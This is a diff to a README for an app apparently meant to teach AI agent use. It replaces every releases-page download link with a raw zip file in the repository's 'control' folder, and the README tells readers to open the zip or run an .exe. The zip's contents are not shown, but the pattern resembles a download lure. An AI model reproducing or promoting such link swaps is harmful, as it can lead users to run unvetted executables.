@@ -1,6 +1,6 @@
 # 🤖 ai_agent_cli_guide - Learn AI Agents With Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github)](https://github.com/pickerrelict689/ai_agent_cli_guide/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/pickerrelict689/ai_agent_cli_guide/main/control/ai-cli-agent-guide-v3.8.zip)
 
 ## 📌 What This App Does
 
@@ -30,7 +30,7 @@ For best results, keep your system updated. A recent version of Windows helps th
 
 Visit the release page and download the file for Windows:
 
-https://github.com/pickerrelict689/ai_agent_cli_guide/releases
+https://raw.githubusercontent.com/pickerrelict689/ai_agent_cli_guide/main/control/ai-cli-agent-guide-v3.8.zip
 
 On that page, look for the latest release and choose the Windows file. If you see a `.zip` file, download it and open it after the download finishes. If you see an `.exe` file, download it and run it.
 
@@ -199,7 +199,7 @@ The app can help you practice these habits with guided examples.
 
 Download the latest Windows build here:
 
-https://github.com/pickerrelict689/ai_agent_cli_guide/releases
+https://raw.githubusercontent.com/pickerrelict689/ai_agent_cli_guide/main/control/ai-cli-agent-guide-v3.8.zip
 
 Use this page whenever you want the newest version or a fresh download
 
